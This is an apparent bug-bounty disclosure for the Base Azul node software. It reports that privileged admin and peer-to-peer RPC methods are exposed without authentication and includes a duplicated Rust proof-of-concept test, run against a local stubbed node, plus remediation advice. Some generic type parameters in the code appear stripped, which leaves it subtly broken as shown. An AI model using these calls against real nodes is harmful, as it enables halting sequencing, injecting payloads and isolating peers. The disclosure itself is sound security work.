# 76031 bc insight privileged admin and p2p rpc are publicly exposed

**Submitted on May 2nd 2026 at 10:41:15 UTC by @psb01 for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #76031
* **Report Type:** Blockchain/DLT
* **Report severity:** Insight
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Shutdown of greater than or equal to 30% of network processing nodes without brute force actions, but does not shut down the network
  * Unintended chain split (network partition)

## Description

## Brief/Intro

Privileged `admin_*` and `opp2p_*` methods are exposed on the node’s public JSON-RPC interface instead of a separate authenticated operator-only endpoint, turning a reachable RPC port into an unauthenticated control plane for node administration and peer-management actions.

## Vulnerability Details

Privileged `admin_*` and `opp2p_*` control methods are exposed on the main JSON-RPC listener for full nodes instead of being kept behind a dedicated, authenticated operator interface. The runtime registers these namespaces based on the presence of `network_admin` and `p2p_network` channels, while full-node startup wiring always provides those channels and `RpcActor::start` does not enforce the documented `enable_admin` boundary. The server stack described in the findings also lacks request authentication, and the default listener configuration can make the RPC socket network reachable. Once mounted, the handlers forward attacker-controlled inputs directly into sequencer-control, payload-ingestion, and swarm-management operations. As a result, normal public RPC exposure becomes an unauthenticated control plane for both node administration and peer-network policy.

## Impact Details

A remote caller that can reach the RPC port can stop or start sequencing, flip recovery mode, override leadership behavior, reset derivation, and inject attacker-chosen unsafe payload work into the engine path. The same caller can also block or disconnect honest peers, blacklist IPs or subnets, protect attacker-controlled peers, and force outbound dials, letting them isolate the node, bias its peer set, or repeatedly degrade availability.

## References

Affected file: `crates/consensus/service/src/actors/rpc/actor.rs`

## Considerations for below POC

PoC uses an in-process `RpcActor` with stubbed engine/sequencer clients and local channel receivers to verify that unauthenticated HTTP callers can invoke `admin_*` and `opp2p_*` methods when `enable_admin=false`. It demonstrates public exposure and forwarding of privileged control messages.

## Remediation

Gate registration of the privileged `admin_*` and `opp2p_*` RPC namespaces on `RpcBuilder.enable_admin`, so channel presence alone no longer exposes operator control methods on the public listener.

## Proof of Concept

### Test case artifact

```rust

//! PoC showing that `RpcActor` exposes privileged `admin_*` and `opp2p_*` methods on the
//! public HTTP listener even when `RpcBuilder.enable_admin` is `false`.

use std::{
    net::{IpAddr, Ipv4Addr, SocketAddr, TcpListener},
    num::NonZeroUsize,
    sync::Arc,
    time::Duration,
};

use alloy_eips::BlockNumberOrTag;
use alloy_primitives::B256;
use alloy_rpc_types_engine::ExecutionPayloadV1;
use async_trait::async_trait;
use base_common_rpc_types_engine::{BaseExecutionPayload, BaseExecutionPayloadEnvelope};
use base_consensus_engine::EngineState;
use base_consensus_genesis::RollupConfig;
use base_consensus_gossip::P2pRpcRequest;
use base_consensus_node::{NodeActor, RpcActor, RpcContext};
use base_consensus_rpc::{
    AdminApiClient, BaseP2PApiClient, EngineRpcClient, HealthzResponse, NetworkAdminQuery,
    RpcBuilder, SequencerAdminAPIClient, SequencerAdminAPIError,
};
use base_consensus_safedb::DisabledSafeDB;
use base_protocol::{L2BlockInfo, OutputRoot};
use jsonrpsee::{
    core::{RpcResult, client::ClientT},
    http_client::HttpClientBuilder,
    rpc_params,
};
use tokio::{
    sync::{mpsc, watch},
    time::{sleep, timeout},
};
use tokio_util::sync::CancellationToken;

#[derive(Clone, Debug, Default)]
struct StubEngineRpcClient;

#[async_trait]
impl EngineRpcClient for StubEngineRpcClient {
    async fn get_config(&self) -> RpcResult {
        Ok(RollupConfig::default())
    }

    async fn get_state(&self) -> RpcResult {
        Ok(EngineState::default())
    }

    async fn output_at_block(
        &self,
        _block: BlockNumberOrTag,
    ) -> RpcResult<(L2BlockInfo, OutputRoot, EngineState)> {
        Ok((
            L2BlockInfo::default(),
            OutputRoot::from_parts(B256::ZERO, B256::ZERO, B256::ZERO),
            EngineState::default(),
        ))
    }

    async fn dev_get_task_queue_length(&self) -> RpcResult {
        Ok(0)
    }

    async fn dev_subscribe_to_engine_queue_length(&self) -> RpcResult> {
        let (_, rx) = watch::channel(0);
        Ok(rx)
    }

    async fn dev_subscribe_to_engine_state(&self) -> RpcResult> {
        let (_, rx) = watch::channel(EngineState::default());
        Ok(rx)
    }
}

#[derive(Debug, PartialEq, Eq)]
enum SequencerCall {
    SetRecoveryMode(bool),
}

#[derive(Debug)]
struct RecordingSequencerAdminClient {
    sender: mpsc::Sender,
}

impl RecordingSequencerAdminClient {
    async fn record(&self, call: SequencerCall) -> Result<(), SequencerAdminAPIError> {
        self.sender
            .send(call)
            .await
            .map_err(|err| SequencerAdminAPIError::RequestError(err.to_string()))
    }
}

#[async_trait]
impl SequencerAdminAPIClient for RecordingSequencerAdminClient {
    async fn is_sequencer_active(&self) -> Result {
        Ok(false)
    }

    async fn is_conductor_enabled(&self) -> Result {
        Ok(false)
    }

    async fn is_recovery_mode(&self) -> Result {
        Ok(false)
    }

    async fn start_sequencer(&self, _unsafe_head: B256) -> Result<(), SequencerAdminAPIError> {
        Ok(())
    }

    async fn stop_sequencer(&self) -> Result {
        Ok(B256::ZERO)
    }

    async fn set_recovery_mode(&self, mode: bool) -> Result<(), SequencerAdminAPIError> {
        self.record(SequencerCall::SetRecoveryMode(mode)).await
    }

    async fn override_leader(&self) -> Result<(), SequencerAdminAPIError> {
        Ok(())
    }

    async fn reset_derivation_pipeline(&self) -> Result<(), SequencerAdminAPIError> {
        Ok(())
    }
}

fn dummy_envelope() -> BaseExecutionPayloadEnvelope {
    BaseExecutionPayloadEnvelope {
        parent_beacon_block_root: None,
        execution_payload: BaseExecutionPayload::V2(alloy_rpc_types_engine::ExecutionPayloadV2 {
            payload_inner: ExecutionPayloadV1 {
                parent_hash: B256::ZERO,
                fee_recipient: alloy_primitives::Address::ZERO,
                state_root: B256::ZERO,
                receipts_root: B256::ZERO,
                logs_bloom: alloy_primitives::Bloom::ZERO,
                prev_randao: B256::ZERO,
                block_number: 1,
                gas_limit: 0,
                gas_used: 0,
                timestamp: 0,
                extra_data: alloy_primitives::Bytes::new(),
                base_fee_per_gas: alloy_primitives::U256::ZERO,
                block_hash: B256::ZERO,
                transactions: vec![],
            },
            withdrawals: vec![],
        }),
    }
}

fn unused_socket_addr() -> SocketAddr {
    let listener = TcpListener::bind((Ipv4Addr::LOCALHOST, 0)).expect("bind ephemeral port");
    let addr = listener.local_addr().expect("read ephemeral port");
    drop(listener);
    addr
}

async fn wait_until_ready(client: &jsonrpsee::http_client::HttpClient) {
    for _ in 0..50 {
        if client.request::("healthz", rpc_params![]).await.is_ok() {
            return;
        }
        sleep(Duration::from_millis(50)).await;
    }

    panic!("rpc server did not become ready");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn test_public_http_rpc_exposes_admin_and_p2p_methods_even_when_admin_disabled() {
    let socket = unused_socket_addr();
    let config = RpcBuilder {
        socket,
        no_restart: true,
        enable_admin: false,
        admin_persistence: None,
        ws_enabled: false,
        dev_enabled: false,
        http_timeout: Duration::from_secs(5),
        max_concurrent_requests: NonZeroUsize::new(16).expect("non-zero concurrency limit"),
    };

    let (p2p_tx, mut p2p_rx) = mpsc::channel(8);
    let (network_admin_tx, mut network_admin_rx) = mpsc::channel(8);
    let (l1_watcher_tx, _l1_watcher_rx) = mpsc::channel(1);
    let (sequencer_tx, mut sequencer_rx) = mpsc::channel(8);
    let cancellation = CancellationToken::new();

    let actor = RpcActor::new(
        config,
        StubEngineRpcClient,
        Some(RecordingSequencerAdminClient { sender: sequencer_tx }),
        Arc::new(DisabledSafeDB),
    );

    let actor_handle = tokio::spawn(actor.start(RpcContext {
        cancellation: cancellation.clone(),
        p2p_network: Some(p2p_tx),
        network_admin: Some(network_admin_tx),
        l1_watcher_queries: l1_watcher_tx,
    }));

    let client = HttpClientBuilder::default()
        .build(format!("http://{socket}"))
        .expect("build rpc client");
    wait_until_ready(&client).await;

    client
        .admin_set_recover_mode(true)
        .await
        .expect("unauthenticated caller should reach admin_setRecoverMode");
    match timeout(Duration::from_secs(1), sequencer_rx.recv())
        .await
        .expect("sequencer control call was not forwarded in time")
    {
        Some(SequencerCall::SetRecoveryMode(true)) => {}
        other => panic!("unexpected sequencer control message: {other:?}"),
    }

    let payload = dummy_envelope();
    client
        .admin_post_unsafe_payload(payload.clone())
        .await
        .expect("unauthenticated caller should reach admin_postUnsafePayload");
    match timeout(Duration::from_secs(1), network_admin_rx.recv())
        .await
        .expect("network admin message was not forwarded in time")
    {
        Some(NetworkAdminQuery::PostUnsafePayload { payload: observed }) => {
            assert_eq!(observed, payload, "rpc forwarded attacker-controlled payload")
        }
        other => panic!("unexpected network admin message: {other:?}"),
    }

    let blocked_addr = IpAddr::V4(Ipv4Addr::new(203, 0, 113, 9));
    client
        .opp2p_block_addr(blocked_addr)
        .await
        .expect("unauthenticated caller should reach opp2p_blockAddr");
    match timeout(Duration::from_secs(1), p2p_rx.recv())
        .await
        .expect("p2p control message was not forwarded in time")
    {
        Some(P2pRpcRequest::BlockAddr { address }) => {
            assert_eq!(address, blocked_addr, "rpc forwarded attacker-controlled IP block")
        }
        other => panic!("unexpected p2p control message: {other:?}"),
    }

    cancellation.cancel();
    let actor_result = timeout(Duration::from_secs(3), actor_handle)
        .await
        .expect("rpc actor did not shut down after cancellation")
        .expect("rpc actor task panicked");
    assert!(actor_result.is_ok(), "rpc actor returned error: {actor_result:?}");
}
```

### Extra files

`crates/consensus/service/tests/rpc_admin_public_exposure.rs`

```rust

//! PoC showing that `RpcActor` exposes privileged `admin_*` and `opp2p_*` methods on the
//! public HTTP listener even when `RpcBuilder.enable_admin` is `false`.

use std::{
    net::{IpAddr, Ipv4Addr, SocketAddr, TcpListener},
    num::NonZeroUsize,
    sync::Arc,
    time::Duration,
};

use alloy_eips::BlockNumberOrTag;
use alloy_primitives::B256;
use alloy_rpc_types_engine::ExecutionPayloadV1;
use async_trait::async_trait;
use base_common_rpc_types_engine::{BaseExecutionPayload, BaseExecutionPayloadEnvelope};
use base_consensus_engine::EngineState;
use base_consensus_genesis::RollupConfig;
use base_consensus_gossip::P2pRpcRequest;
use base_consensus_node::{NodeActor, RpcActor, RpcContext};
use base_consensus_rpc::{
    AdminApiClient, BaseP2PApiClient, EngineRpcClient, HealthzResponse, NetworkAdminQuery,
    RpcBuilder, SequencerAdminAPIClient, SequencerAdminAPIError,
};
use base_consensus_safedb::DisabledSafeDB;
use base_protocol::{L2BlockInfo, OutputRoot};
use jsonrpsee::{
    core::{RpcResult, client::ClientT},
    http_client::HttpClientBuilder,
    rpc_params,
};
use tokio::{
    sync::{mpsc, watch},
    time::{sleep, timeout},
};
use tokio_util::sync::CancellationToken;

#[derive(Clone, Debug, Default)]
struct StubEngineRpcClient;

#[async_trait]
impl EngineRpcClient for StubEngineRpcClient {
    async fn get_config(&self) -> RpcResult {
        Ok(RollupConfig::default())
    }

    async fn get_state(&self) -> RpcResult {
        Ok(EngineState::default())
    }

    async fn output_at_block(
        &self,
        _block: BlockNumberOrTag,
    ) -> RpcResult<(L2BlockInfo, OutputRoot, EngineState)> {
        Ok((
            L2BlockInfo::default(),
            OutputRoot::from_parts(B256::ZERO, B256::ZERO, B256::ZERO),
            EngineState::default(),
        ))
    }

    async fn dev_get_task_queue_length(&self) -> RpcResult {
        Ok(0)
    }

    async fn dev_subscribe_to_engine_queue_length(&self) -> RpcResult> {
        let (_, rx) = watch::channel(0);
        Ok(rx)
    }

    async fn dev_subscribe_to_engine_state(&self) -> RpcResult> {
        let (_, rx) = watch::channel(EngineState::default());
        Ok(rx)
    }
}

#[derive(Debug, PartialEq, Eq)]
enum SequencerCall {
    SetRecoveryMode(bool),
}

#[derive(Debug)]
struct RecordingSequencerAdminClient {
    sender: mpsc::Sender,
}

impl RecordingSequencerAdminClient {
    async fn record(&self, call: SequencerCall) -> Result<(), SequencerAdminAPIError> {
        self.sender
            .send(call)
            .await
            .map_err(|err| SequencerAdminAPIError::RequestError(err.to_string()))
    }
}

#[async_trait]
impl SequencerAdminAPIClient for RecordingSequencerAdminClient {
    async fn is_sequencer_active(&self) -> Result {
        Ok(false)
    }

    async fn is_conductor_enabled(&self) -> Result {
        Ok(false)
    }

    async fn is_recovery_mode(&self) -> Result {
        Ok(false)
    }

    async fn start_sequencer(&self, _unsafe_head: B256) -> Result<(), SequencerAdminAPIError> {
        Ok(())
    }

    async fn stop_sequencer(&self) -> Result {
        Ok(B256::ZERO)
    }

    async fn set_recovery_mode(&self, mode: bool) -> Result<(), SequencerAdminAPIError> {
        self.record(SequencerCall::SetRecoveryMode(mode)).await
    }

    async fn override_leader(&self) -> Result<(), SequencerAdminAPIError> {
        Ok(())
    }

    async fn reset_derivation_pipeline(&self) -> Result<(), SequencerAdminAPIError> {
        Ok(())
    }
}

fn dummy_envelope() -> BaseExecutionPayloadEnvelope {
    BaseExecutionPayloadEnvelope {
        parent_beacon_block_root: None,
        execution_payload: BaseExecutionPayload::V2(alloy_rpc_types_engine::ExecutionPayloadV2 {
            payload_inner: ExecutionPayloadV1 {
                parent_hash: B256::ZERO,
                fee_recipient: alloy_primitives::Address::ZERO,
                state_root: B256::ZERO,
                receipts_root: B256::ZERO,
                logs_bloom: alloy_primitives::Bloom::ZERO,
                prev_randao: B256::ZERO,
                block_number: 1,
                gas_limit: 0,
                gas_used: 0,
                timestamp: 0,
                extra_data: alloy_primitives::Bytes::new(),
                base_fee_per_gas: alloy_primitives::U256::ZERO,
                block_hash: B256::ZERO,
                transactions: vec![],
            },
            withdrawals: vec![],
        }),
    }
}

fn unused_socket_addr() -> SocketAddr {
    let listener = TcpListener::bind((Ipv4Addr::LOCALHOST, 0)).expect("bind ephemeral port");
    let addr = listener.local_addr().expect("read ephemeral port");
    drop(listener);
    addr
}

async fn wait_until_ready(client: &jsonrpsee::http_client::HttpClient) {
    for _ in 0..50 {
        if client.request::("healthz", rpc_params![]).await.is_ok() {
            return;
        }
        sleep(Duration::from_millis(50)).await;
    }

    panic!("rpc server did not become ready");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn test_public_http_rpc_exposes_admin_and_p2p_methods_even_when_admin_disabled() {
    let socket = unused_socket_addr();
    let config = RpcBuilder {
        socket,
        no_restart: true,
        enable_admin: false,
        admin_persistence: None,
        ws_enabled: false,
        dev_enabled: false,
        http_timeout: Duration::from_secs(5),
        max_concurrent_requests: NonZeroUsize::new(16).expect("non-zero concurrency limit"),
    };

    let (p2p_tx, mut p2p_rx) = mpsc::channel(8);
    let (network_admin_tx, mut network_admin_rx) = mpsc::channel(8);
    let (l1_watcher_tx, _l1_watcher_rx) = mpsc::channel(1);
    let (sequencer_tx, mut sequencer_rx) = mpsc::channel(8);
    let cancellation = CancellationToken::new();

    let actor = RpcActor::new(
        config,
        StubEngineRpcClient,
        Some(RecordingSequencerAdminClient { sender: sequencer_tx }),
        Arc::new(DisabledSafeDB),
    );

    let actor_handle = tokio::spawn(actor.start(RpcContext {
        cancellation: cancellation.clone(),
        p2p_network: Some(p2p_tx),
        network_admin: Some(network_admin_tx),
        l1_watcher_queries: l1_watcher_tx,
    }));

    let client = HttpClientBuilder::default()
        .build(format!("http://{socket}"))
        .expect("build rpc client");
    wait_until_ready(&client).await;

    client
        .admin_set_recover_mode(true)
        .await
        .expect("unauthenticated caller should reach admin_setRecoverMode");
    match timeout(Duration::from_secs(1), sequencer_rx.recv())
        .await
        .expect("sequencer control call was not forwarded in time")
    {
        Some(SequencerCall::SetRecoveryMode(true)) => {}
        other => panic!("unexpected sequencer control message: {other:?}"),
    }

    let payload = dummy_envelope();
    client
        .admin_post_unsafe_payload(payload.clone())
        .await
        .expect("unauthenticated caller should reach admin_postUnsafePayload");
    match timeout(Duration::from_secs(1), network_admin_rx.recv())
        .await
        .expect("network admin message was not forwarded in time")
    {
        Some(NetworkAdminQuery::PostUnsafePayload { payload: observed }) => {
            assert_eq!(observed, payload, "rpc forwarded attacker-controlled payload")
        }
        other => panic!("unexpected network admin message: {other:?}"),
    }

    let blocked_addr = IpAddr::V4(Ipv4Addr::new(203, 0, 113, 9));
    client
        .opp2p_block_addr(blocked_addr)
        .await
        .expect("unauthenticated caller should reach opp2p_blockAddr");
    match timeout(Duration::from_secs(1), p2p_rx.recv())
        .await
        .expect("p2p control message was not forwarded in time")
    {
        Some(P2pRpcRequest::BlockAddr { address }) => {
            assert_eq!(address, blocked_addr, "rpc forwarded attacker-controlled IP block")
        }
        other => panic!("unexpected p2p control message: {other:?}"),
    }

    cancellation.cancel();
    let actor_result = timeout(Duration::from_secs(3), actor_handle)
        .await
        .expect("rpc actor did not shut down after cancellation")
        .expect("rpc actor task panicked");
    assert!(actor_result.is_ok(), "rpc actor returned error: {actor_result:?}");
}
```

### Setup script artifact

```rust

#!/bin/bash
set -e

# install dependencies
cargo fetch --locked
```

### Output artifact

```rust

running 1 test
test test_public_http_rpc_exposes_admin_and_p2p_methods_even_when_admin_disabled ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.00s

   Compiling base-consensus-node v0.8.0 (/repo/crates/consensus/service)
    Finished `test` profile [unoptimized + debuginfo] target(s) in 1.52s
     Running tests/rpc_admin_public_exposure.rs (target/debug/deps/rpc_admin_public_exposure-748d9abc8f95b3a8)
```
